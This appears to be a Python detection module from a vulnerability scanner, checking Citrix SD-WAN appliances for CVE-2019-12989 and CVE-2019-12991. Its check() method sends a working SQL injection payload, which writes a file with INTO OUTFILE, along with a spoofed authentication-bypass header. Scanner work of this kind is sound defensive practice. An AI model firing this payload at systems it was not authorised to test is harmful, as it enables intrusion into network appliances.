"""Agent Asteroid implementation for CVE-2019-12989 and CVE-2019-12991 remarque:not tested on a live target"""

import json
import random
import logging
from urllib3 import exceptions
from urllib3 import disable_warnings

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

disable_warnings(exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 90
HEADERS = {"SSL_CLIENT_VERIFY": "SUCCESS"}

logger = logging.getLogger(__name__)

VULNERABILITY_TITLE = (
    "Security Vulnerabilities in Citrix CVE-2019-12989 and CVE-2019-12991"
)
VULNERABILITY_REFERENCE = "CVE-2019-12989"
VULNERABILITY_DESCRIPTION = (
    "CVE-2019-12989: The cgi-bin/sdwanrestapi/getpackagefile.cgi Perl script "
    "contains a SQL injection vulnerability that can be exploited by a remote, unauthenticated attacker."
    "Input validation is not applied before incorporating user input in "
    "a SQL query. By exploiting this vulnerability with a crafted HTTP request, an attacker is able to"
    "write to (and create) files in locations writable by the 'mysql' user. "
    "CVE-2019-12991: Installpatch.cgi suffers from a command injection vulnerability."
    " This vulnerability can be exploited by a remote, authenticated attacker to execute OS commands"
    " with root privileges.Specifically, the 'installfile' parameter value is not "
    "validated prior to using it in a call to the Perl system() function."
)
VULNERABILITY_SHORT_DESCRIPTION = (
    "Citrix SD-WAN Appliance 10.2.2 - Authentication Bypass / Remote Command Execution"
)
REFERENCES = {
    "Tenable Research": "https://www.tenable.com/security/research/tra-2019-32",
    "Medium - Tenable TechBlog": "https://medium.com/tenable-techblog/an-exploit-chain-against-citrix-sd-wan-709db08fb4ac",
    "Citrix Support Article": "https://support.citrix.com/article/CTX251987",
}
RECOMMENDATION = """
    These vulnerabilities have been addressed in the following software versions:
    NetScaler SD-WAN Center 10.0.8 and NetScaler SD-WAN 10.0.8 Appliance
    Citrix SD-WAN Center 10.2.3 and Citrix SD-WAN 10.2.3 Appliance
    Citrix strongly recommends that customers using vulnerable software upgrade their SD-WAN Center management console or SD-WAN appliance to the new version or later as soon as possible.
"""
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE201912989Exploit(definitions.Exploit):
    """CVE-2019-12989 and CVE-2019-12991: Security Vulnerabilities in Citrix SD-WAN"""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        short_description=VULNERABILITY_SHORT_DESCRIPTION,
        recommendation=RECOMMENDATION,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2019-12989", "CVE-2019-12991"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return True

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        url = (
            f"{target.origin}"
            f"/sdwan/nitro/v1/config/get_package_file?action=file_download"
        )
        # The generated random number might be relatively small, possibly leading to false positive
        # We'll adjust this value once a live vulnerable instance is found
        token = random.randint(10000, 99999)
        json_object = {
            "get_package_file": {
                "site_name": "blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_"
                + str(token)
                + "';#",
                "appliance_type": "primary",
                "package_type": "active",
            }
        }
        try:
            r = self.session.post(
                url, headers=HEADERS, json=json_object, timeout=DEFAULT_TIMEOUT
            )
        except requests_exceptions.RequestException as e:
            logger.error("Error : %s", e)
            return []
        # error is expected
        expected = {
            "status": "fail",
            "message": "Invalid value specified for site_name or appliance_type",
        }
        try:
            if r.status_code == 400 and r.json() == expected:
                vulnerability = self.create_vulnerability(target)
                vulnerability.technical_detail = (
                    f"{target.url} is vulnerable to CVE-2019-12989 and CVE-2019-12991"
                )
                return [vulnerability]
            else:
                return []
        except json.JSONDecodeError:
            return []
